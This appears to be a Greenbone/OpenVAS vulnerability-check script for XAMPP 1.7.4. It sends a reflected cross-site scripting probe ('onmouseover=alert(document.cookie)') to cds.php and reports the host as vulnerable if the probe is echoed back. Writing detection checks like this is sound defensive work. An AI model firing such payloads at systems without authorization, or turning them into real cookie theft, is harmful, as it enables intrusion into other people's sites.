CPE = "cpe:/a:apachefriends:xampp";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802261" );
	script_version( "2021-06-24T02:07:35+0000" );
	script_tag( name: "last_modification", value: "2021-06-24 02:07:35 +0000 (Thu, 24 Jun 2021)" );
	script_tag( name: "creation_date", value: "2011-10-28 16:17:13 +0200 (Fri, 28 Oct 2011)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "XAMPP Web Server Multiple Cross Site Scripting Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_xampp_detect.sc" );
	script_mandatory_keys( "xampp/detected" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/106244/xampp174-xss.txt" );
	script_xref( name: "URL", value: "http://mc-crew.info/xampp-1-7-4-for-windows-multiple-site-scripting-vulnerabilities" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site." );
	script_tag( name: "affected", value: "XAMPP version 1.7.4 and prior." );
	script_tag( name: "insight", value: "Multiple flaws are due to improper validation of user-supplied input
  to the 'text' parameter in 'ming.php' and input appended to the URL in
  cds.php, that allows attackers to execute arbitrary HTML and script code
  in a user's browser session in the context of an affected site." );
	script_tag( name: "solution", value: "Upgrade to XAMPP version 1.7.7 or later." );
	script_tag( name: "summary", value: "This host is running XAMPP and is prone to multiple cross site
  scripting vulnerabilities." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/cds.php/'onmouseover=alert(document.cookie)>";
req = http_get( item: url, port: port );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(ereg( pattern: "^HTTP/1\\.[01] 200", string: res ) && ContainsString( res, "cds.php/'onmouseover=alert(document.cookie)>" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

